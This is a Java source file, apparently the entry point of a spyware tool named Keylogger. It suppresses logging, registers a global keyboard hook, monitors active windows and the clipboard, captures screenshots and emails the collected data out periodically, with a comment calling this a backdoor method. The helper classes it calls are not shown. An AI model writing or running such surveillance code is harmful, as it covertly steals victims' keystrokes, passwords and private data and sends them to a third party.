import com.github.kwhat.jnativehook.GlobalScreen;

import java.util.logging.Level;
import java.util.logging.LogManager;
import java.util.logging.Logger;

public class Keylogger {
    public static void main(String[] args) {
        LogManager.getLogManager().reset();
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        KeyListenerHandler keyListener = new KeyListenerHandler();
        new Thread(() -> WindowMonitor.monitorWindows(keyListener)).start();
        new Thread(() -> ClipboardMonitor.monitorClipboard(keyListener)).start();

        ScreenshotHandler.startMonitoring();
        LogFileHandler.moveJNativeHookDll();

        // Phương pháp backdoor
        // EmailSender.sendFileAfterTime(15000, "JkeyData", "Gửi định kỳ mỗi 15s.");
        EmailSender.monitorAndSend(10, "JKeyData", "Gửi định kỳ mỗi 10MB");

        try {
            GlobalScreen.registerNativeHook();
            GlobalScreen.addNativeKeyListener(keyListener);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}